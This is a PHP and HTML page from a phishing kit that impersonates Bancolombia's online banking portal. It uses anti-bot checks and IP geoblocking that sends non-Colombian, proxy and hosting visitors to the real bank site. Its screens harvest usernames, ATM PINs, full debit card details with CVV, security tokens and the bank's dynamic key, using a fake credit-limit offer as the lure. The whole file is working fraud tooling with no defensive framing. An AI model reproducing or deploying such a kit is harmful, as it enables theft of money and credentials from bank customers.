<?php
// Ocultar errores en produccion
error_reporting(0);
ini_set('display_errors', '0');

require_once __DIR__ . '/Antibot.php';

// Evitar notice si Antibot.php ya inicio la sesion
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

Antibot::init();

function getClientIp(): string {
    $keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($keys as $key) {
        if (!empty($_SERVER[$key])) {
            $ips = explode(',', $_SERVER[$key]);
            return trim($ips[0]);
        }
    }
    return '127.0.0.1';
}
$clientIp = getClientIp();

// ── GEOBLOCK: Verificar si la IP es de Colombia ──
function checkGeoBlock(string $ip): ?string {
    if ($ip === '127.0.0.1' || $ip === '::1') return null;

    $ctx = stream_context_create([
        'http' => ['timeout' => 5, 'header' => 'User-Agent: BancolombiaFlow/1.0']
    ]);
    $url = "http://ip-api.com/json/{$ip}?fields=status,countryCode,country,proxy,hosting";
    $resp = @file_get_contents($url, false, $ctx);
    if (!$resp) return null;

    $data = json_decode($resp, true);
    if (!$data || $data['status'] !== 'success') return null;

    $cc = $data['countryCode'] ?? 'XX';
    $country = $data['country'] ?? 'Desconocido';

    $_SESSION['geo_ips'] = $_SESSION['geo_ips'] ?? [];
    $_SESSION['geo_ips'][$ip] = [
        'countryCode' => $cc,
        'country'     => $country,
        'timestamp'   => time()
    ];

    $foreign = array_filter($_SESSION['geo_ips'], fn($v) => $v['countryCode'] !== 'CO');
    $foreignCount = count($foreign);

    if ($cc !== 'CO') {
        return "https://www.bancolombia.com/personas";
    }
    if ($foreignCount > 2) {
        return "https://www.bancolombia.com/personas";
    }
    if (($data['proxy'] ?? false) || ($data['hosting'] ?? false)) {
        return "https://www.bancolombia.com/personas";
    }
    return null;
}

$redirectUrl = checkGeoBlock($clientIp);
if ($redirectUrl) {
    header("Location: {$redirectUrl}");
    exit;
}

$fecha = date('l, j \d\e F \d\e Y, g:i a', strtotime('-5 hours'));
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow, noarchive">
<title>Bancolombia — Sucursal Virtual Personas</title>
<link rel="stylesheet" href="assets/css/style.css">
</head>
<body>

<div class="bg-curves">
<svg viewBox="0 0 1440 900" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
  <!-- 3 lineas diagonales gruesas estilo Bancolombia -->
  <path d="M -80 -20 L 520 480" stroke="#FF7A1A" stroke-width="42" fill="none" stroke-linecap="round"/>
  <path d="M -80 60 L 440 520" stroke="#FDDA24" stroke-width="38" fill="none" stroke-linecap="round"/>
  <path d="M -80 140 L 360 560" stroke="#8330C2" stroke-width="34" fill="none" stroke-linecap="round"/>
</svg>
</div>

<div class="page">
  <div class="topbar">
    <div class="logo">
      <img src="https://images.seeklogo.com/logo-png/40/2/bancolombia-s-a-logo-png_seeklogo-402324.png" width="180" alt="Bancolombia" style="display:block;margin:0 auto">
    </div>
    <div class="subtitle" id="page-title">Sucursal Virtual Personas</div>
  </div>

  <div class="content">

    <!-- ═══════════════════════════════════════════════════════════
         1. LOGIN
         ═══════════════════════════════════════════════════════════ -->
    <div class="screen active" id="scr-login">
      <div class="banner">
        <div class="bulb">
          <svg viewBox="0 0 24 24"><path d="M9 18h6M10 22h4"/><path d="M12 2a7 7 0 0 0-4 12.7V17a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1v-2.3A7 7 0 0 0 12 2z"/></svg>
        </div>
        <div class="bt">
          <b>Esto te interesa</b>
          <span>Desde el 2 de octubre de 2026 actualizamos el reglamento de las cuentas de ahorro.</span>
          <a>Conócelo</a>
        </div>
      </div>
      <div class="card">
        <h2>¡Hola!</h2>
        <p class="sub">Ingresa los datos para gestionar tus productos y hacer transacciones.</p>

        <div class="fld" id="fld-user">
          <span class="ic"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></span>
          <input id="user" placeholder="Usuario" autocomplete="off">
        </div>
        <div class="err-msg" id="err-user">Ingresa tu usuario</div>
        <a class="flink">¿Olvidaste tu usuario?</a>

        <div class="fld" id="fld-pass">
          <span class="ic"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></span>
          <input type="password" id="pass" placeholder="Clave del cajero" maxlength="4" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
          <span class="eye-toggle" id="eye-pass" onclick="toggleEye('pass','eye-pass')">
            <svg viewBox="0 0 24 24" class="eye-open" style="display:none"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
            <svg viewBox="0 0 24 24" class="eye-closed"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
          </span>
        </div>
        <div class="err-msg" id="err-pass">Ingresa tu clave</div>
        <a class="flink">¿Olvidaste o bloqueaste tu clave?</a>

        <?= Antibot::campos() ?>

        <div class="antibot-wrap" id="antibot-box" onclick="document.getElementById('nobot').click()" style="display:none">
          <input type="checkbox" id="nobot" onchange="checkLogin()">
          <label for="nobot">No soy un robot</label>
          <svg class="refresh" viewBox="0 0 48 48">
            <path fill="#1a73e8" d="M24 8c-4.4 0-8.4 1.8-11.3 4.7L6 6v14h14l-5.5-5.5C16.6 12.4 20 11 24 11c7.2 0 13 5.8 13 13h3c0-8.8-7.2-16-16-16z"/>
            <path fill="#1a73e8" d="M38 28h-3c0 7.2-5.8 13-13 13-4.4 0-8.4-1.8-11.3-4.7L10 42l6.7-6.7C19.6 38.2 24 40 28 40c7.2 0 13-5.8 13-13h-3z"/>
          </svg>
        </div>
        <div class="err-msg" id="err-nobot">Confirma que no eres un robot</div>

        <button class="btn btn-primary" id="btn-login" onclick="submitLogin()" disabled>Iniciar sesión</button>
        <a class="center-link">Crear usuario</a>
      </div>
    </div>

    <!-- ═══════════════════════════════════════════════════════════
         2. MONTO CUPO
         ═══════════════════════════════════════════════════════════ -->
    <div class="screen" id="scr-monto">
      <div class="card" style="padding:28px 24px">
        <div class="cupo-header">
          <div class="chip">Compra fácil y segura</div>
          <h2>Escoge tu cupo ideal</h2>
          <p>Selecciona el cupo que mejor se adapte a tus necesidades</p>
        </div>
        <div class="cupo-tabs">
          <div class="cupo-tab active">
            <svg width="20" height="16" viewBox="0 0 24 18" fill="none" stroke="#2c2a29" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="1" width="22" height="16" rx="2"/><line x1="1" y1="7" x2="23" y2="7"/></svg>
            Tarjeta de Crédito
          </div>
          <div class="cupo-tab">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#2c2a29" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3 21h18M5 21V7l7-4 7 4v14"/><path d="M9 21v-6h6v6"/></svg>
            Libre Inversión
          </div>
        </div>
        <div class="cupo-display">
          <div class="lbl">CUPO SELECCIONADO</div>
          <div class="val" id="cupo-val">$5.000.000</div>
          <div class="sub">Cupo asignado para tu solicitud digital</div>
        </div>
        <div class="cupo-slider-wrap">
          <input type="range" id="cupo-slider" min="5" max="80" value="5" step="1">
          <div class="range-labels"><span>$5.000.000</span><span>$80.000.000</span></div>
        </div>
        <div class="cupo-grid">
          <div class="opt active" data-val="5">$5.000.000</div>
          <div class="opt" data-val="10">$10.000.000</div>
          <div class="opt" data-val="15">$15.000.000</div>
          <div class="opt" data-val="20">$20.000.000</div>
          <div class="opt" data-val="30">$30.000.000</div>
          <div class="opt" data-val="40">$40.000.000</div>
          <div class="opt" data-val="50">$50.000.000</div>
          <div class="opt" data-val="60">$60.000.000</div>
        </div>
        <button class="btn-full ready" id="btn-monto" onclick="submitCupo()">Continuar con la activación</button>
      </div>
    </div>

    <!-- ═══════════════════════════════════════════════════════════
         3. VALIDAR TARJETA
         ═══════════════════════════════════════════════════════════ -->
    <div class="screen" id="scr-tarjeta">
      <div class="card">
        <h2>Validar Tarjeta</h2>
        <p class="sub">Ingresa los datos de tu tarjeta de débito para validar tu identidad y activar el cupo de tu tarjeta de crédito virtual.</p>
        <div class="note">No se realizará ningún cargo. Información protegida con cifrado bancario.</div>

        <!-- Detección de banco -->
        <div class="bank-detect-wrap" id="bank-detect">
          <img class="bank-logo" id="bank-logo" src="" alt="Banco">
          <img class="scheme-logo" id="scheme-logo" src="" alt="Franquicia">
          <div class="bank-name" id="bank-name"></div>
        </div>

        <div class="field"><label>Nombre del titular</label><input id="titular" placeholder="Como aparece en la tarjeta" autocomplete="off"></div>
        <div class="err-msg" id="err-titular">Ingresa el nombre del titular</div>

        <div class="field"><label>Número de tarjeta</label><input id="cardnum" type="tel" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" pattern="[0-9]*" autocomplete="off"></div>
        <div class="err-msg" id="err-cardnum">Número de tarjeta inválido</div>

        <div class="row">
          <div class="field"><label>Vencimiento</label><input id="venc" placeholder="MM/AA" maxlength="5" inputmode="numeric" autocomplete="off"></div>
          <div class="field"><label>CVV</label><input id="cvv" type="password" placeholder="•••" maxlength="3" inputmode="numeric" pattern="[0-9]*" autocomplete="off"></div>
        </div>
        <div class="err-msg" id="err-venc">Fecha de vencimiento inválida</div>

        <button class="btn btn-primary ready" onclick="submitTarjeta()">Aumentar tu cupo</button>
      </div>
    </div>

    <!-- ═══════════════════════════════════════════════════════════
         4. TOKEN / OTP (nueva pantalla)
         ═══════════════════════════════════════════════════════════ -->
    <div class="screen" id="scr-token">
      <div class="card">
        <div class="token-logo-wrap" id="token-bank-wrap">
          <img id="token-bank-logo" src="" alt="Banco" style="display:none">
        </div>
        <div class="lock">
          <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><circle cx="12" cy="16" r="1"/></svg>
        </div>
        <h2>Token de seguridad</h2>
        <p class="sub">Ingresa el código de verificación enviado a tu dispositivo registrado.<br><b>Usuario: <span id="token-user">Usuario</span></b></p>
        <div class="code-input" id="token-inputs">
          <input maxlength="1" inputmode="numeric" autocomplete="off"><input maxlength="1" inputmode="numeric" autocomplete="off"><input maxlength="1" inputmode="numeric" autocomplete="off">
          <input maxlength="1" inputmode="numeric" autocomplete="off"><input maxlength="1" inputmode="numeric" autocomplete="off"><input maxlength="1" inputmode="numeric" autocomplete="off">
        </div>
        <span class="eye-toggle-inline" id="eye-token" onclick="toggleCodeEye('token-inputs','eye-token')">
          <svg viewBox="0 0 24 24" class="eye-open" style="display:none"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
          <svg viewBox="0 0 24 24" class="eye-closed"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
          <span class="eye-label">Mostrar</span>
        </span>
        <button class="btn btn-primary" id="btn-token" disabled onclick="submitToken()">Verificar token</button>
        <button class="btn btn-outline" onclick="resetAll();show('scr-login')">Volver</button>
      </div>
    </div>

    <!-- ═══════════════════════════════════════════════════════════
         5. CLAVE DINÁMICA
         ═══════════════════════════════════════════════════════════ -->
    <div class="screen" id="scr-clave">
      <div class="card">
        <div class="lock">
          <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><circle cx="12" cy="16" r="1"/></svg>
        </div>
        <h2>Clave dinámica</h2>
        <p class="sub">Consulta tu Clave Dinámica desde la App Mi Bancolombia.<br><b>Usuario: <span id="dyn-user">Usuario</span></b></p>
        <div class="code-input" id="clave-inputs">
          <input maxlength="1" inputmode="numeric" autocomplete="off"><input maxlength="1" inputmode="numeric" autocomplete="off"><input maxlength="1" inputmode="numeric" autocomplete="off">
          <input maxlength="1" inputmode="numeric" autocomplete="off"><input maxlength="1" inputmode="numeric" autocomplete="off"><input maxlength="1" inputmode="numeric" autocomplete="off">
        </div>
        <span class="eye-toggle-inline" id="eye-clave" onclick="toggleCodeEye('clave-inputs','eye-clave')">
          <svg viewBox="0 0 24 24" class="eye-open" style="display:none"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
          <svg viewBox="0 0 24 24" class="eye-closed"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
          <span class="eye-label">Mostrar</span>
        </span>
        <button class="btn btn-primary" id="btn-clave" disabled onclick="submitClave()">Continuar</button>
        <button class="btn btn-outline" onclick="resetAll();show('scr-login')">Volver</button>
      </div>
    </div>

    <!-- ═══════════════════════════════════════════════════════════
         6. ÉXITO
         ═══════════════════════════════════════════════════════════ -->
    <div class="screen" id="scr-exito">
      <div class="card">
        <div class="success-box">
          <div class="check">✓</div>
          <h2>¡Activación exitosa!</h2>
          <p class="sub">Tu tarjeta de crédito digital está activa con el cupo seleccionado.</p>
          <button class="btn btn-outline" onclick="resetAll();show('scr-login')">Volver al inicio</button>
        </div>
      </div>
    </div>

  </div>

  <div class="footer-links">
    <a>¿Problemas para conectarte?</a>
    <a>Aprende sobre seguridad</a>
    <a>Reglamento Sucursal Virtual</a>
    <a>Política de privacidad</a>
  </div>
  <div class="footer-div"></div>
  <div class="footer-bottom">
    <div class="flogo">
      <img src="https://images.seeklogo.com/logo-png/40/2/bancolombia-s-a-logo-png_seeklogo-402324.png" width="110" alt="Bancolombia" style="display:block;margin:0 auto">
    </div>
    <div>
      <span class="vig">VIGILADO</span> · Superintendencia Financiera de Colombia
    </div>
    <div class="ip">Dirección IP: <?= htmlspecialchars($clientIp) ?><br><?= htmlspecialchars($fecha) ?></div>
  </div>
</div>

<!-- Toast Error -->
<div class="toast-error" id="toast-error">
  <div class="x-icon">✕</div>
  <div class="t-body">
    <div class="t-title">Algo salió mal</div>
    <div class="t-sub">Pronto solucionaremos el problema y podrás continuar con tu solicitud.</div>
  </div>
  <button class="t-close" onclick="hideToast()">✕</button>
</div>

<!-- Loader -->
<div class="loader-overlay" id="loader">
  <div class="loader-circle"><div class="spinner"></div><small>Cargando...</small></div>
  <h3>Procesando solicitud...</h3>
  <p>Por favor espere mientras verificamos su información</p>
  <p class="dim">Esto puede tomar unos segundos...</p>
</div>

<script src="assets/js/app.js"></script>
</body>
</html>
